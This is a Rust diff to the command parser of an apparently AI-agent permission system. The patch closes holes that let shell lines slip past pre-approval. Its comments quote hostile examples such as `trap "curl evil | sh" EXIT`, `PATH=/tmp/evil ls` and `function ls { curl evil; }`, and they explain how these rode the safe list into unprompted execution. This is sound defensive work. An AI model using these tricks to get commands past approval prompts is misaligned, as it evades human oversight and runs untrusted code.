@@ -11,10 +11,21 @@
 //! "this is pre-approved" and "the user approved this" are one lookup rather
 //! than two mechanisms that have to agree about shell syntax.
 //!
-//! The parser here is deliberately not a shell. It answers one question - which
-//! programs does this line run - and every case it cannot answer confidently
-//! makes the whole line ungrantable, because "approve this once and ask again
-//! next time" is the safe direction.
+//! The parser here is deliberately not a shell. It answers one question - what
+//! does this line decide about what executes - and every case it cannot answer
+//! confidently makes the whole line ungrantable, because "approve this once and
+//! ask again next time" is the safe direction.
+//!
+//! **A key names everything in a segment that decides what executes, not just
+//! the program.** Naming only the program is the shape of bug this module has
+//! shipped more than once: `PATH=/tmp/evil ls` keyed a bare `ls`, `trap "curl
+//! evil" EXIT; ls` keyed a bare `ls`, and both rode the default safe list into
+//! an unprompted execution of somebody else's code. So a segment also yields an
+//! `env:NAME` key for each variable it binds (`ENV_BINDING`, and `VAR=value`
+//! prefixes), and a builtin that installs code to run later is refused outright
+//! (`CODE_INSTALLING`). When adding a construct here, the question to ask is
+//! not "does this run a program" but "could this change which program a later
+//! word resolves to".
 
 use std::collections::BTreeSet;
 
@@ -30,19 +41,42 @@ const PREFIX_KEYWORDS: &[&str] = &[
 ];
 
 /// Words that bind data, close a block, or are shell builtins that launch
-/// nothing. A segment starting with one of these runs no program, so it
-/// contributes no key: this is what stops `for i in $(seq 1 11); do ...`
-/// producing `shell:for i`, and `export JAVA_HOME=...` producing a key naming a
-/// path.
-const SEGMENT_KEYWORDS: &[&str] = &[
-    "for", "in", "case", "esac", "fi", "done", "select", "function", "break", "continue", "return",
-    "shift", "exit", "jobs", "disown", "wait", "set", "unset", "export", "local", "readonly",
-    "umask", "trap", "alias", "unalias", "declare", "typeset",
+/// nothing and bind no name. A segment starting with one of these runs no
+/// program and changes nothing a later segment depends on, so it contributes no
+/// key: this is what stops `for i in $(seq 1 11); do ...` producing
+/// `shell:for i`.
+///
+/// `set` is here because it toggles shell options and positional parameters -
+/// `set -euo pipefail` is in half the commands an agent writes and cannot
+/// redirect what a later program resolves to. The builtins that *can* are in
+/// [`ENV_BINDING`] and [`CODE_INSTALLING`].
+const INERT_KEYWORDS: &[&str] = &[
+    "for", "in", "case", "esac", "fi", "done", "select", "break", "continue", "return", "shift",
+    "exit", "jobs", "disown", "wait", "set", "umask",
 ];
+
+/// Builtins that bind a variable name, so the segment contributes an
+/// `env:NAME` key per name it touches.
+///
+/// `export PATH=/tmp/evil` runs no program, but the next segment's `ls` is a
+/// different `ls` because of it. Keying the name is what stops a safe-listed
+/// program in a later segment silently covering the whole line.
+const ENV_BINDING: &[&str] = &["export", "unset", "local", "readonly", "declare", "typeset"];
+
+/// Builtins that install code to run later, at a point this parser cannot
+/// attribute to any program. The whole line becomes ungrantable.
+///
+/// `trap "curl evil | sh" EXIT` runs on exit, `function ls { curl evil; }` and
+/// `alias ls=...` replace a name a later segment resolves. In each case the
+/// payload is a quoted word or a block, so no amount of naming programs in this
+/// segment describes what will actually execute.
+const CODE_INSTALLING: &[&str] = &["function", "trap", "alias", "unalias"];
 
 /// Programs that run a command assembled at runtime, so nothing in the line
 /// names what will actually execute. A grant must never cover one of these.
-const UNREADABLE_PROGRAMS: &[&str] = &["eval", "source"];
+///
+/// `.` is `source` spelled the other way.
+const UNREADABLE_PROGRAMS: &[&str] = &["eval", "source", "."];
 
 /// Programs whose second word is payload rather than a second program, so
 /// folding it into the key only splits one grant into many.
@@ -77,11 +111,27 @@ struct Word {
 /// cannot read this" have opposite consequences: the first contributes no key
 /// and lets the rest of the line stand, the second makes the whole line
 /// ungrantable.
+///
+/// A segment yields more than one key when it decides more than one thing:
+/// `PATH=/tmp/evil ls` runs `ls`, but *which* `ls` is decided by the
+/// assignment, so it contributes both `ls` and `env:PATH`.
 #[derive(Debug, Clone, PartialEq, Eq)]
 enum SegmentKey {
-    Key(String),
+    Keys(Vec<String>),
     NothingRuns,
     Unreadable,
+}
+
+impl SegmentKey {
+    /// `NothingRuns` for an empty set, so a segment that turned out to decide
+    /// nothing reads as such rather than as an empty grant.
+    fn from_keys(keys: Vec<String>) -> Self {
+        if keys.is_empty() {
+            Self::NothingRuns
+        } else {
+            Self::Keys(keys)
+        }
+    }
 }
 
 /// The keys covering `command`, sorted and deduped, each prefixed with
@@ -96,8 +146,8 @@ pub fn command_keys(command: &str) -> Vec<String> {
     let mut keys = BTreeSet::new();
     for words in &segments {
         match segment_key(words) {
-            SegmentKey::Key(k) => {
-                keys.insert(format!("{KEY_PREFIX}{k}"));
+            SegmentKey::Keys(found) => {
+                keys.extend(found.into_iter().map(|k| format!("{KEY_PREFIX}{k}")));
             }
             SegmentKey::NothingRuns => {}
             // One unreadable command is enough: the line as a whole runs
@@ -341,21 +391,43 @@ fn take_substitution(chars: &mut std::iter::Peekable<std::str::Chars>) -> Option
     }
 }
 
-/// The key one command contributes: the program, plus the second word when that
-/// word narrows *which* program runs rather than being a flag, a number, or the
-/// program's data.
+/// The keys one command contributes: the program, plus the second word when
+/// that word narrows *which* program runs rather than being a flag, a number,
+/// or the program's data, plus an `env:NAME` key for every variable the segment
+/// binds.
+///
+/// The rule the three key families share: **a key names everything in the
+/// segment that decides what executes.** A program name alone does not, which
+/// is what made `PATH=/tmp/evil ls` read as a plain `ls` and ride the safe list
+/// into an unprompted execution of somebody else's binary.
 fn segment_key(words: &[Word]) -> SegmentKey {
+    let mut env_keys = Vec::new();
     let mut rest = words;
     // Strip leading keywords and `VAR=value` assignments until a program is
-    // reached. `FOO=1 do cargo test` keys `shell:cargo test`.
+    // reached. `FOO=1 do cargo test` keys `shell:cargo test` and `shell:env:FOO`.
     loop {
         let Some(first) = rest.first() else {
-            return SegmentKey::NothingRuns;
+            return SegmentKey::from_keys(env_keys);
         };
-        if SEGMENT_KEYWORDS.contains(&first.text.as_str()) {
-            return SegmentKey::NothingRuns;
+        let text = first.text.as_str();
+        if INERT_KEYWORDS.contains(&text) {
+            return SegmentKey::from_keys(env_keys);
         }
-        if PREFIX_KEYWORDS.contains(&first.text.as_str()) || is_assignment(first) {
+        if CODE_INSTALLING.contains(&text) {
+            return SegmentKey::Unreadable;
+        }
+        if ENV_BINDING.contains(&text) {
+            return match binding_keys(&rest[1..], &mut env_keys) {
+                Ok(()) => SegmentKey::from_keys(env_keys),
+                Err(()) => SegmentKey::Unreadable,
+            };
+        }
+        if PREFIX_KEYWORDS.contains(&text) {
+            rest = &rest[1..];
+            continue;
+        }
+        if let Some(name) = assignment_name(first) {
+            env_keys.push(env_key(name));
             rest = &rest[1..];
             continue;
         }
@@ -371,17 +443,58 @@ fn segment_key(words: &[Word]) -> SegmentKey {
     }
     match rest.get(1) {
         Some(arg) if folds_into_key(&program.text, arg) => {
-            SegmentKey::Key(format!("{} {}", program.text, arg.text))
+            env_keys.push(format!("{} {}", program.text, arg.text));
         }
-        _ => SegmentKey::Key(program.text.clone()),
+        _ => env_keys.push(program.text.clone()),
     }
+    SegmentKey::Keys(env_keys)
 }
 
-/// Whether a word is a `VAR=value` prefix rather than a program.
-fn is_assignment(word: &Word) -> bool {
-    let Some((name, _)) = word.text.split_once('=') else {
-        return false;
-    };
+/// The key naming a bound variable.
+///
+/// The `env:` namespace is deliberately one token with no space, so
+/// [`program_of`] cannot widen a safe-list entry onto it: naming `env` as a safe
+/// command grants nothing, and there is no spelling of a `[safe_commands]` entry
+/// that covers every variable at once. A user who wants one grants it by name.
+fn env_key(name: &str) -> String {
+    format!("env:{name}")
+}
+
+/// Collect the names an [`ENV_BINDING`] builtin touches, or `Err` when one of
+/// them cannot be read.
+///
+/// Flags are skipped (`declare -x FOO` binds `FOO`), and a name supplied by an
+/// expansion is refused outright: `export $VAR` binds whatever `$VAR` says this
+/// run, so no key written today describes it.
+fn binding_keys(args: &[Word], out: &mut Vec<String>) -> Result<(), ()> {
+    for arg in args {
+        if arg.text.starts_with('-') || arg.text.starts_with('+') {
+            continue;
+        }
+        if !arg.literal {
+            return Err(());
+        }
+        let name = arg
+            .text
+            .split_once('=')
+            .map_or(arg.text.as_str(), |(n, _)| n);
+        if !is_variable_name(name) {
+            return Err(());
+        }
+        out.push(env_key(name));
+    }
+    Ok(())
+}
+
+/// The variable name a `VAR=value` prefix binds, or `None` when the word is a
+/// program rather than an assignment.
+fn assignment_name(word: &Word) -> Option<&str> {
+    let (name, _) = word.text.split_once('=')?;
+    is_variable_name(name).then_some(name)
+}
+
+/// Whether `name` is spelled the way a shell variable is.
+fn is_variable_name(name: &str) -> bool {
     !name.is_empty()
         && name.starts_with(|c: char| c.is_ascii_alphabetic() || c == '_')
         && name.chars().all(|c| c.is_ascii_alphanumeric() || c == '_')
